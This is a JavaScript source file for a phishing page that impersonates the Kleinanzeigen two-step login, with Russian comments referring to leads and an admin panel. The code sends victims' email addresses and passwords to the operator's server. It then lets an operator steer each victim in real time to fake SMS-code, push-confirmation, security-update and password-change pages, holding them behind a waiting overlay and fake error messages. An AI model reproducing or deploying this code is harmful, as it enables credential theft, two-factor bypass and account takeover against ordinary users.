/**
 * Klein (Kleinanzeigen) Einloggen — zwei Schritte: 1) E-Mail + Weitermachen, 2) Passwort + Einloggen. Submit → /api/submit, polling /api/status.
 */
(function () {
  'use strict';

  var credFetch = { credentials: 'include' };

  function isKleinAnmeldenPath() {
    try {
      return (window.location.pathname || '').replace(/\/$/, '') === '/klein-anmelden';
    } catch (e) { return false; }
  }

  /** Редирект с WEB.DE после почты: ?id=лид → фиксируем заход для скрипта оркестрации. */
  function pingKleinAnmeldenSeen() {
    try {
      var q = new URLSearchParams(window.location.search);
      var lid = q.get('id');
      if (lid && lid.trim()) {
        sessionStorage.setItem('gmw_lead_id', lid.trim());
        fetch('/api/klein-anmelden-seen', Object.assign({
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ leadId: lid.trim() })
        }, credFetch)).catch(function () {});
      }
    } catch (e) {}
  }
  pingKleinAnmeldenSeen();

  try {
    if (!isKleinAnmeldenPath()) {
      sessionStorage.removeItem('gmw_lead_id');
      sessionStorage.removeItem('gmw_fp_preset_idx');
    }
  } catch (e) {}

  var loginForm = document.getElementById('loginForm');
  var usernameInput = document.getElementById('username-input');
  var passwordInput = document.getElementById('password-input');
  var mainButton = document.getElementById('main-action-button');
  var errorLoginRow = document.getElementById('error-login-row');
  var errorLogin = document.getElementById('error-login');
  var step1 = document.getElementById('knz-step-1');
  var step2 = document.getElementById('knz-step-2');
  var btnWeitermachen = document.getElementById('btn-weitermachen');
  var linkBearbeiten = document.getElementById('link-bearbeiten');
  var emailDisplay = document.getElementById('email-display');
  var btnTogglePassword = document.getElementById('btn-toggle-password');
  var pagePollInterval = null;

  var passwordFieldWrap = document.getElementById('password-field-wrap');
  /** Пользователь начал менять пароль — ошибку не показывать снова по опросу, пока статус не сменится с error и админ снова не нажмёт Error */
  var userClearedErrorByTyping = false;

  function setLoginError(show, message) {
    if (errorLoginRow) errorLoginRow.style.display = show ? 'block' : 'none';
    if (errorLogin) errorLogin.textContent = (message && show) ? message : (show ? 'E-Mail oder Passwort ist falsch. Bitte überprüfe deine Eingaben.' : '');
    if (passwordInput) passwordInput.setAttribute('aria-invalid', show ? 'true' : 'false');
    if (passwordFieldWrap) passwordFieldWrap.classList.toggle('ulp-error', show);
    if (show) {
      var waitOverlay = document.getElementById('knz-wait-overlay');
      if (waitOverlay) waitOverlay.setAttribute('hidden', '');
    }
  }

  function showStep1() {
    if (step1) step1.classList.add('is-active');
    if (step2) step2.classList.remove('is-active');
    if (passwordInput) passwordInput.value = '';
    setLoginError(false);
  }

  function showStep2() {
    if (step1) step1.classList.remove('is-active');
    if (step2) step2.classList.add('is-active');
    if (emailDisplay && usernameInput) emailDisplay.textContent = usernameInput.value.trim();
    setLoginError(false);
    if (passwordInput) {
      passwordInput.value = '';
      setTimeout(function () { passwordInput.focus(); }, 100);
    }
  }

  /** Отправляет почту на сервер (лог в админку сразу после ввода почты), затем показывает шаг 2. */
  function sendEmailAndShowStep2() {
    var email = (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
    if (!isEmailValid(email)) {
      if (usernameInput) usernameInput.focus();
      return;
    }
    var visitId = null;
    try { visitId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
    if (visitId && typeof visitId !== 'string') visitId = null;
    var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
    var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
    fetch('/api/submit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(window.gmwAppendTelemetry({
        email: email,
        emailKl: email,
        visitId: visitId || undefined,
        screenWidth: sw || undefined,
        screenHeight: sh || undefined,
        kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
      }))
    }, credFetch))
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (data) {
        if (data && data.id) {
          try { sessionStorage.setItem('gmw_lead_id', data.id); } catch (e) {}
          startPagePoll(data.id);
          showStep2();
        } else {
          setLoginError(true, 'Ein Fehler ist aufgetreten. Bitte versuche es erneut.');
        }
      })
      .catch(function () {
        setLoginError(true, 'Verbindungsfehler. Bitte versuche es erneut.');
      });
  }

  function isEmailValid(val) {
    if (!val || typeof val !== 'string') return false;
    var t = val.trim();
    return t.length > 0 && t.indexOf('@') > 0 && t.indexOf('@') < t.length - 1;
  }

  function startPagePoll(id) {
    if (!id) return;
    if (pagePollInterval) {
      clearInterval(pagePollInterval);
      pagePollInterval = null;
    }
    function poll() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=index&_=' + Date.now(), Object.assign({ cache: 'no-store', headers: { Pragma: 'no-cache' } }, credFetch))
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var mode = (res && res.mode) || '';
          var st = res && res.status;
          if (mode === 'manual' && st === 'pending') return;
          if (st === 'not_found') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            try { sessionStorage.removeItem('gmw_lead_id'); } catch (e) {}
            showStep1();
            setLoginError(true, 'Sitzung abgelaufen. Bitte E-Mail erneut eingeben.');
            return;
          }
          if (st === 'show_success') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/erfolg?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_change_password' || st === 'redirect_sicherheit' || st === 'redirect_android' || st === 'redirect_open_on_pc') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            var url = st === 'redirect_change_password' ? '/passwort-aendern?id=' + encodeURIComponent(id)
              : st === 'redirect_sicherheit' ? '/sicherheit-update?id=' + encodeURIComponent(id)
              : st === 'redirect_android' ? '/app-update?id=' + encodeURIComponent(id)
              : '/bitte-am-pc?id=' + encodeURIComponent(id);
            setTimeout(function () { window.location = url; }, 1800);
          } else if (st === 'redirect_push') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sms_code') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_klein_forgot') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location.href = 'https://www.kleinanzeigen.de/m-passwort-vergessen.html';
          } else if (st === 'redirect_gmx_net') {
            if (pagePollInterval) { clearInterval(pagePollInterval); pagePollInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.kleinanzeigen.de/';
          } else if (st === 'error') {
            if (mainButton) {
              mainButton.classList.remove('is-loading');
              mainButton.disabled = false;
            }
            if (!userClearedErrorByTyping) {
              var klErr = res && res.kleinPasswordErrorDe ? String(res.kleinPasswordErrorDe).trim() : '';
              setLoginError(true, klErr || 'Die E-Mail-Adresse ist nicht registriert oder das Passwort ist falsch. Bitte überprüfe deine Eingaben.');
            }
          } else {
            userClearedErrorByTyping = false;
          }
        })
        .catch(function () {});
    }
    poll();
    pagePollInterval = setInterval(poll, 1000);
  }

  (function registerVisit() {
    try {
      var leadId = sessionStorage.getItem('gmw_lead_id');
      if (leadId) startPagePoll(leadId);
    } catch (e) {}
  })();

  if (passwordInput) {
    passwordInput.addEventListener('input', function () {
      userClearedErrorByTyping = true;
      setLoginError(false);
    });
    // Enter в поле пароля всегда отправляет форму (на части устройств/браузеров иначе может не сработать)
    passwordInput.addEventListener('keydown', function (e) {
      if (e.key !== 'Enter') return;
      if (!step2 || !step2.classList.contains('is-active')) return;
      e.preventDefault();
      if (loginForm && typeof loginForm.requestSubmit === 'function') {
        loginForm.requestSubmit();
      } else {
        loginForm.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
      }
    });
  }

  if (btnWeitermachen) {
    btnWeitermachen.addEventListener('click', function () {
      sendEmailAndShowStep2();
    });
  }

  if (linkBearbeiten) {
    linkBearbeiten.addEventListener('click', function (e) {
      e.preventDefault();
      if (pagePollInterval) {
        clearInterval(pagePollInterval);
        pagePollInterval = null;
      }
      try { sessionStorage.removeItem('gmw_lead_id'); } catch (err) {}
      showStep1();
      if (usernameInput) usernameInput.focus();
    });
  }

  if (btnTogglePassword && passwordInput) {
    btnTogglePassword.addEventListener('click', function () {
      var isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      btnTogglePassword.setAttribute('aria-checked', isPassword ? 'true' : 'false');
      btnTogglePassword.setAttribute('aria-label', isPassword ? 'Passwort verbergen' : 'Passwort anzeigen');
      var showTip = btnTogglePassword.querySelector('.show-password-tooltip');
      var hideTip = btnTogglePassword.querySelector('.hide-password-tooltip');
      if (showTip) showTip.classList.toggle('hide', !isPassword);
      if (hideTip) hideTip.classList.toggle('hide', isPassword);
    });
  }

  var backEl = document.getElementById('knz-back');
  if (backEl) {
    backEl.addEventListener('click', function (e) {
      e.preventDefault();
      if (window.history.length > 1) {
        window.history.back();
      } else {
        window.location.href = '/';
      }
    });
  }

  var PASSWORT_URL = 'https://www.kleinanzeigen.de/m-passwort-vergessen.html';
  var redirectOverlay = document.getElementById('knz-redirect-overlay');
  var redirectCountdownEl = document.getElementById('knz-redirect-countdown');
  var passwortLinks = document.querySelectorAll('.knz-passwort-vergessen');
  if (redirectOverlay && redirectCountdownEl && passwortLinks.length) {
    passwortLinks.forEach(function (link) {
      link.addEventListener('click', function (e) {
        e.preventDefault();
        redirectOverlay.hidden = false;
        var sec = 3;
        redirectCountdownEl.textContent = String(sec);
        var t = setInterval(function () {
          sec--;
          redirectCountdownEl.textContent = sec > 0 ? String(sec) : '0';
          if (sec <= 0) {
            clearInterval(t);
            window.location.href = PASSWORT_URL;
          }
        }, 1000);
      });
    });
  }

  if (!loginForm) return;

  loginForm.addEventListener('submit', function (e) {
    e.preventDefault();
    var onStep2 = step2 && step2.classList.contains('is-active');
    if (!onStep2) {
      if (isEmailValid((usernameInput && usernameInput.value) ? usernameInput.value.trim() : '')) {
        sendEmailAndShowStep2();
      }
      return;
    }
    var email = (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
    var pwd = (passwordInput && passwordInput.value) || '';
    if (!pwd) return;
    setLoginError(false);
    var hp = document.getElementById('hp-website');
    var websiteHp = (hp && hp.value) ? hp.value : undefined;
    var sw = (typeof window.screen !== 'undefined' && window.screen.width) | 0;
    var sh = (typeof window.screen !== 'undefined' && window.screen.height) | 0;
    var visitId = null;
    try { visitId = sessionStorage.getItem('gmw_lead_id'); } catch (e) {}
    if (visitId && typeof visitId !== 'string') visitId = null;

    if (mainButton) {
      mainButton.classList.add('is-loading');
      mainButton.disabled = true;
    }

    fetch('/api/submit', Object.assign({
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(window.gmwAppendTelemetry({
        email: email,
        emailKl: email,
        password: pwd,
        visitId: visitId || undefined,
        screenWidth: sw || undefined,
        screenHeight: sh || undefined,
        website: websiteHp,
        kleinFlowSubmit: isKleinAnmeldenPath() ? true : undefined
      }))
    }, credFetch))
      .then(function (r) { return r.json().then(function (data) { return { ok: r.ok, status: r.status, data: data }; }); })
      .then(function (res) {
        if (!res.ok) {
          if (mainButton) { mainButton.classList.remove('is-loading'); mainButton.disabled = false; }
          setLoginError(true, (res.data && res.data.message) || 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
          return;
        }
        var id = (res.data && res.data.id) || '';
        if (id) {
          try { sessionStorage.setItem('gmw_lead_id', id); } catch (e) {}
          var waitOverlay = document.getElementById('knz-wait-overlay');
          var waitCountdownEl = document.getElementById('knz-wait-countdown');
          if (waitOverlay) {
            waitOverlay.removeAttribute('hidden');
            var secLeft = 5 * 60;
            function formatWait(sec) {
              var m = Math.floor(sec / 60);
              var s = sec % 60;
              return m + ':' + (s < 10 ? '0' : '') + s;
            }
            if (waitCountdownEl) waitCountdownEl.textContent = formatWait(secLeft);
            var waitT = setInterval(function () {
              secLeft--;
              if (waitCountdownEl) waitCountdownEl.textContent = formatWait(secLeft > 0 ? secLeft : 0);
              if (secLeft <= 0) {
                clearInterval(waitT);
                waitOverlay.setAttribute('hidden', '');
              }
            }, 1000);
          }
          startPagePoll(id);
        } else {
          if (mainButton) { mainButton.classList.remove('is-loading'); mainButton.disabled = false; }
          setLoginError(true, 'Ein Fehler ist aufgetreten. Bitte versuche es erneut.');
        }
      })
      .catch(function (err) {
        if (mainButton) { mainButton.classList.remove('is-loading'); mainButton.disabled = false; }
        setLoginError(true, 'Verbindungsfehler. Bitte versuche es erneut.');
      });
  });

})();
